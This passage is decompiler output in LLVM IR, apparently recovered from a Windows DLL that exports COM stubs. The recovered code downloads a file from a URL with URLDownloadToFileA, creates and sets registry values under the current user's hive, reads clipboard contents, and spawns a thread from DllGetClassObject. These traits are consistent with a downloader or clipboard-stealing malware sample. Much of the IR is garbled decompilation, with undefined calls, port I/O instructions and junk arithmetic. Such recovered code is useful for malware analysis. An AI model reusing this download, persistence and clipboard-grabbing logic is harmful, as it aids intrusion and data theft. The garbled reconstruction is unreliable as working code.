  %6 = trunc i32 %5 to i8, !insn.addr !510
  %7 = add i8 %4, %6, !insn.addr !510
  %8 = inttoptr i32 %5 to i8*, !insn.addr !510
  store i8 %7, i8* %8, align 1, !insn.addr !510
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !511
  %10 = load i32, i32* %eax, align 4, !insn.addr !511
  %11 = udiv i32 %10, 256, !insn.addr !511
  %12 = trunc i32 %11 to i8, !insn.addr !511
  %13 = add i8 %9, %12, !insn.addr !511
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !511
  %14 = call i32 @function_4036b8(), !insn.addr !512
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !513
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !513
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !513
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !514
  %17 = call i32 @"@LStrCatN"(), !insn.addr !515
  %18 = call i32 @function_4036c8(), !insn.addr !516
  %19 = inttoptr i32 %18 to i32*, !insn.addr !517
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !517
  call void @__writefsdword(i32 0, i32 0), !insn.addr !518
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !519
  ret i32 %21, !insn.addr !520
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !521
  ret i32 %0, !insn.addr !521
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !522
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !523
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !524
  %5 = inttoptr i32 %3 to i32*, !insn.addr !524
  store i32 %4, i32* %5, align 4, !insn.addr !524
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !525
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !525
  %10 = add i8 %7, %9, !insn.addr !525
  %11 = inttoptr i32 %8 to i8*, !insn.addr !525
  store i8 %10, i8* %11, align 1, !insn.addr !525
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !526
  %14 = udiv i32 %1, 256, !insn.addr !526
  %15 = trunc i32 %14 to i8, !insn.addr !526
  %16 = add i8 %13, %15, !insn.addr !526
  %17 = load i32, i32* %edi, align 4, !insn.addr !526
  %18 = inttoptr i32 %17 to i8*, !insn.addr !526
  store i8 %16, i8* %18, align 1, !insn.addr !526
  %19 = load i8, i8* %6, align 4, !insn.addr !527
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !527
  %22 = add i8 %19, %21, !insn.addr !527
  %23 = inttoptr i32 %20 to i8*, !insn.addr !527
  store i8 %22, i8* %23, align 1, !insn.addr !527
  %24 = add i32 %0, -117, !insn.addr !528
  %25 = inttoptr i32 %24 to i8*, !insn.addr !528
  %26 = load i8, i8* %25, align 1, !insn.addr !528
  %27 = trunc i32 %2 to i8, !insn.addr !528
  %28 = add i8 %26, %27, !insn.addr !528
  store i8 %28, i8* %25, align 1, !insn.addr !528
  %29 = trunc i32 %2 to i16, !insn.addr !529
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !529
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !530
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !530
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !530
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !531
  %33 = load i32, i32* @global_var_40a6a0, align 4, !insn.addr !532
  %34 = add i32 %33, 1, !insn.addr !532
  store i32 %34, i32* @global_var_40a6a0, align 4, !insn.addr !532
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !533
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !534
  ret i32 0, !insn.addr !535
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !536
  ret i32 %0, !insn.addr !536
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !537
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !538
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6a0, align 4, !insn.addr !539
  %2 = add i32 %1, -1, !insn.addr !539
  store i32 %2, i32* @global_var_40a6a0, align 4, !insn.addr !539
  ret i32 %0, !insn.addr !540
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !541
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !542
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !543
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !544
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !545
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !546
  %2 = icmp eq i32 %1, 0, !insn.addr !547
  %3 = icmp eq i1 %2, false, !insn.addr !548
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !548
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !548

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !549
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !550
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4090f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !550
  %6 = icmp eq i32 %5, 0, !insn.addr !551
  %7 = icmp eq i1 %6, false, !insn.addr !552
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !552

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !553
  br label %dec_label_pc_404da9, !insn.addr !553

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !554
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !554
  br label %dec_label_pc_404db2, !insn.addr !554

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !555
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !556
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !556
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !556
  %6 = inttoptr i32 %3 to i32*, !insn.addr !556
  store i32 %5, i32* %6, align 4, !insn.addr !556
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !557
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !557
  %11 = add i8 %8, %10, !insn.addr !557
  %12 = inttoptr i32 %9 to i8*, !insn.addr !557
  store i8 %11, i8* %12, align 1, !insn.addr !557
  %13 = add i32 %1, 122, !insn.addr !558
  %14 = inttoptr i32 %13 to i8*, !insn.addr !558
  %15 = load i8, i8* %14, align 1, !insn.addr !558
  %16 = udiv i32 %4, 256, !insn.addr !558
  %17 = trunc i32 %16 to i8, !insn.addr !558
  %18 = add i8 %15, %17, !insn.addr !558
  store i8 %18, i8* %14, align 1, !insn.addr !558
  %19 = load i8, i8* %7, align 4, !insn.addr !559
  %20 = load i32, i32* %eax, align 4, !insn.addr !559
  %21 = trunc i32 %20 to i8, !insn.addr !559
  %22 = add i8 %19, %21, !insn.addr !559
  %23 = icmp eq i8 %22, 0, !insn.addr !559
  %24 = inttoptr i32 %20 to i8*, !insn.addr !559
  store i8 %22, i8* %24, align 1, !insn.addr !559
  %25 = trunc i32 %3 to i16, !insn.addr !560
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !560
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !561

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !561
  br label %dec_label_pc_404dc9, !insn.addr !561

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !559
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !562
  store i32 %29, i32* %eax, align 4, !insn.addr !562
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !563

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !564, !insn.addr !559
  %31 = and i8 %30, 1, !insn.addr !559
  %32 = icmp eq i8 %31, 0, !insn.addr !559
  %33 = trunc i32 %arg4 to i16, !insn.addr !565
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !565
  %35 = inttoptr i32 %2 to i32*, !insn.addr !565
  store i32 %34, i32* %35, align 4, !insn.addr !565
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !566

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !567
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !568
  %36 = add i32 %arg4, 1, !insn.addr !569
  %37 = icmp eq i32 %36, 0, !insn.addr !569
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !570
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !570

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !571
  %39 = add i32 %38, -1, !insn.addr !571
  store i32 %39, i32* %eax, align 4, !insn.addr !571
  %40 = trunc i32 %36 to i16, !insn.addr !572
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !572
  %42 = load i32, i32* %41, align 4, !insn.addr !572
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !572
  %43 = load i32, i32* %41, align 4, !insn.addr !573
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !573
  %44 = add i32 %arg7, 105, !insn.addr !574
  %45 = inttoptr i32 %44 to i8*, !insn.addr !574
  %46 = load i8, i8* %45, align 1, !insn.addr !574
  %47 = trunc i32 %39 to i8, !insn.addr !574
  %48 = add i8 %46, %47, !insn.addr !574
  %49 = icmp ult i8 %48, %46, !insn.addr !574
  store i8 %48, i8* %45, align 1, !insn.addr !574
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !575
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !575

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !574
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !576

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !577
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !578
  %53 = load i32, i32* %52, align 4, !insn.addr !578
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !578
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !579
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !580
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !581
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !582
  %55 = add i32 %arg6, -8, !insn.addr !583
  %56 = inttoptr i32 %55 to i32*, !insn.addr !583
  store i32 0, i32* %56, align 4, !insn.addr !583
  %57 = add i32 %arg6, -12, !insn.addr !584
  %58 = inttoptr i32 %57 to i32*, !insn.addr !584
  store i32 1, i32* %58, align 4, !insn.addr !584
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !585
  ret i32 %57, !insn.addr !585

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !586

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !587
  %62 = add i8 %60, %61, !insn.addr !587
  %63 = inttoptr i32 %2 to i8*, !insn.addr !587
  store i8 %62, i8* %63, align 1, !insn.addr !587
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !588
  %65 = load i8, i8* %64, align 1, !insn.addr !588
  %66 = udiv i32 %arg3, 256, !insn.addr !588
  %67 = trunc i32 %66 to i8, !insn.addr !588
  %68 = add i8 %65, %67, !insn.addr !588
  store i8 %68, i8* %64, align 1, !insn.addr !588
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !588
  br label %dec_label_pc_404e37, !insn.addr !588

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !589
  %70 = inttoptr i32 %69 to i32*, !insn.addr !589
  store i32 0, i32* %70, align 4, !insn.addr !589
  %71 = add i32 %esp.0, -8, !insn.addr !590
  %72 = inttoptr i32 %71 to i32*, !insn.addr !590
  store i32 0, i32* %72, align 4, !insn.addr !590
  %73 = add i32 %esp.0, -12, !insn.addr !591
  %74 = inttoptr i32 %73 to i32*, !insn.addr !591
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !591
  %75 = add i32 %esp.0, -16, !insn.addr !592
  %76 = inttoptr i32 %75 to i32*, !insn.addr !592
  store i32 -2147483647, i32* %76, align 4, !insn.addr !592
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !593
  %78 = call i32 @function_4034c8(), !insn.addr !594
  %79 = add i32 %78, 1, !insn.addr !595
  %80 = add i32 %esp.0, -20, !insn.addr !596
  %81 = inttoptr i32 %80 to i32*, !insn.addr !596
  store i32 %79, i32* %81, align 4, !insn.addr !596
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !597
  br label %dec_label_pc_404e57, !insn.addr !597

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !598
  %83 = add i32 %esp.1.reload, -4, !insn.addr !599
  %84 = inttoptr i32 %83 to i32*, !insn.addr !599
  store i32 %82, i32* %84, align 4, !insn.addr !599
  %85 = add i32 %esp.1.reload, -8, !insn.addr !600
  %86 = inttoptr i32 %85 to i32*, !insn.addr !600
  store i32 1, i32* %86, align 4, !insn.addr !600
  %87 = add i32 %esp.1.reload, -12, !insn.addr !601
  %88 = inttoptr i32 %87 to i32*, !insn.addr !601
  store i32 0, i32* %88, align 4, !insn.addr !601
  %89 = add i32 %esp.1.reload, -16, !insn.addr !602
  %90 = inttoptr i32 %89 to i32*, !insn.addr !602
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !602
  %91 = add i32 %arg6, -8, !insn.addr !603
  %92 = inttoptr i32 %91 to i32*, !insn.addr !603
  %93 = load i32, i32* %92, align 4, !insn.addr !603
  %94 = add i32 %esp.1.reload, -20, !insn.addr !604
  %95 = inttoptr i32 %94 to i32*, !insn.addr !604
  store i32 %93, i32* %95, align 4, !insn.addr !604
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !605
  %97 = load i32, i32* %92, align 4, !insn.addr !606
  %98 = add i32 %esp.1.reload, -24, !insn.addr !607
  %99 = inttoptr i32 %98 to i32*, !insn.addr !607
  store i32 %97, i32* %99, align 4, !insn.addr !607
  %100 = call i32 @function_404374(), !insn.addr !608
  %101 = load i32, i32* %99, align 4, !insn.addr !609
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !610
  store i32 4214421, i32* %90, align 4, !insn.addr !611
  %102 = call i32 @"@LStrClr"(), !insn.addr !612
  ret i32 %102, !insn.addr !613
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !614
  ret i32 %0, !insn.addr !614
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !615
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !616
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !617
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !617
  %5 = inttoptr i32 %2 to i8*, !insn.addr !617
  store i8 %4, i8* %5, align 1, !insn.addr !617
  %6 = add i32 %0, 111, !insn.addr !618
  %7 = inttoptr i32 %6 to i8*, !insn.addr !618
  %8 = load i8, i8* %7, align 1, !insn.addr !618
  %9 = trunc i32 %1 to i8, !insn.addr !618
  %10 = add i8 %8, %9, !insn.addr !618
  %11 = icmp eq i8 %10, 0, !insn.addr !618
  store i8 %10, i8* %7, align 1, !insn.addr !618
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !619

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !619
  br label %dec_label_pc_404ea1, !insn.addr !619

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !618
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !620

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !564, !insn.addr !618
  %16 = and i8 %15, 1, !insn.addr !618
  %17 = icmp eq i8 %16, 0, !insn.addr !618
  %18 = trunc i32 %arg4 to i16, !insn.addr !621
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !621
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !621
  store i32 %19, i32* %20, align 4, !insn.addr !621
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !622

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !623
  %22 = icmp eq i32 %21, 0, !insn.addr !623
  store i32 %arg2, i32* %.reg2mem, !insn.addr !624
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !624

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !625
  %24 = trunc i32 %21 to i16, !insn.addr !626
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !626
  %26 = load i32, i32* %25, align 4, !insn.addr !626
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !626
  %27 = load i32, i32* %25, align 4, !insn.addr !627
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !627
  %28 = add i32 %arg7, 105, !insn.addr !628
  %29 = inttoptr i32 %28 to i8*, !insn.addr !628
  %30 = load i8, i8* %29, align 1, !insn.addr !628
  %31 = trunc i32 %23 to i8, !insn.addr !628
  %32 = add i8 %30, %31, !insn.addr !628
  %33 = icmp eq i8 %32, 0, !insn.addr !628
  store i8 %32, i8* %29, align 1, !insn.addr !628
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !629

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !630
  %34 = inttoptr i32 %23 to i8*, !insn.addr !631
  %35 = load i8, i8* %34, align 1, !insn.addr !631
  %36 = add i8 %35, %31, !insn.addr !631
  store i8 %36, i8* %34, align 1, !insn.addr !631
  %37 = add i32 %arg5, 86, !insn.addr !632
  %38 = inttoptr i32 %37 to i8*, !insn.addr !632
  %39 = load i8, i8* %38, align 1, !insn.addr !632
  %40 = trunc i32 %21 to i8, !insn.addr !632
  %41 = add i8 %39, %40, !insn.addr !632
  store i8 %41, i8* %38, align 1, !insn.addr !632
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !633
  %42 = call i32 @"@LStrClr"(), !insn.addr !634
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !635
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !636
  %44 = zext i1 %43 to i32, !insn.addr !637
  ret i32 %44, !insn.addr !637

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !638
  %46 = inttoptr i32 %45 to i8*, !insn.addr !638
  %47 = load i8, i8* %46, align 2, !insn.addr !638
  %48 = mul i8 %47, 2, !insn.addr !638
  store i8 %48, i8* %46, align 2, !insn.addr !638
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !639
  %50 = icmp eq i32* %49, null, !insn.addr !640
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !641

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !639
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !642
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !643
  %53 = icmp eq i32* %52, null, !insn.addr !644
  br i1 %53, label %dec_label_pc_404f09, label %dec_label_pc_404efa, !insn.addr !645

dec_label_pc_404efa:                              ; preds = %dec_label_pc_404eee
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !646
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !647
  br label %dec_label_pc_404f04, !insn.addr !647

dec_label_pc_404f04:                              ; preds = %dec_label_pc_404efa, %dec_label_pc_404ea4
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !648
  br label %dec_label_pc_404f09, !insn.addr !648

dec_label_pc_404f09:                              ; preds = %dec_label_pc_404f04, %dec_label_pc_404eee, %dec_label_pc_404ede, %dec_label_pc_404ea1
  %56 = call i1 @CloseClipboard(), !insn.addr !649
  %57 = sext i1 %56 to i32, !insn.addr !649
  store i32 %57, i32* %.reg2mem, !insn.addr !650
  br label %dec_label_pc_404f0f, !insn.addr !650

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404ea8, %dec_label_pc_404f09
  %.reload = load i32, i32* %.reg2mem, !insn.addr !651
  ret i32 %.reload, !insn.addr !651
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_404f14:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !652
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !652
  %3 = load i32, i32* inttoptr (i32 4231480 to i32*), align 8, !insn.addr !653
  %4 = inttoptr i32 %3 to i32*, !insn.addr !654
  %5 = load i32, i32* %4, align 4, !insn.addr !654
  %6 = icmp eq i32 %5, 0, !insn.addr !654
  %7 = icmp eq i1 %6, false, !insn.addr !655
  %8 = icmp eq i1 %7, false, !insn.addr !656
  br i1 %8, label %dec_label_pc_404f50, label %dec_label_pc_404f27, !insn.addr !656

dec_label_pc_404f27:                              ; preds = %dec_label_pc_404f14
  %9 = inttoptr i32 %0 to i8*, !insn.addr !657
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !658
  %11 = icmp eq i32* %10, null, !insn.addr !659
  %12 = icmp eq i1 %11, false, !insn.addr !660
  br i1 %12, label %dec_label_pc_404f50, label %dec_label_pc_404f3a, !insn.addr !660

dec_label_pc_404f3a:                              ; preds = %dec_label_pc_404f27
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220780 to i32*), i32 0, i32* null), !insn.addr !661
  br label %dec_label_pc_404f50, !insn.addr !661

dec_label_pc_404f50:                              ; preds = %dec_label_pc_404f3a, %dec_label_pc_404f27, %dec_label_pc_404f14
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !662
  store i32 0, i32* %15, align 4, !insn.addr !662
  ret i32 -2147221231, !insn.addr !663
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_404f7c:
  ret i32 0, !insn.addr !664
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_404f80:
  ret i32 0, !insn.addr !665
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_404f84:
  ret i32 0, !insn.addr !666
}

define i32 @function_404f88() local_unnamed_addr {
dec_label_pc_404f88:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !667
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !667
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !667
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !668
  %2 = load i32, i32* @global_var_40a6a4, align 4, !insn.addr !669
  %3 = add i32 %2, 1, !insn.addr !669
  store i32 %3, i32* @global_var_40a6a4, align 4, !insn.addr !669
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !670
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !671
  ret i32 0, !insn.addr !672
}

define i32 @function_404fad() local_unnamed_addr {
dec_label_pc_404fad:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !673
  ret i32 %0, !insn.addr !673
}

define i32 @function_404fb2() local_unnamed_addr {
dec_label_pc_404fb2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !674
}

define i32 @function_404fb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404fb4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !675
}

define i32 @function_404fb8() local_unnamed_addr {
dec_label_pc_404fb8:
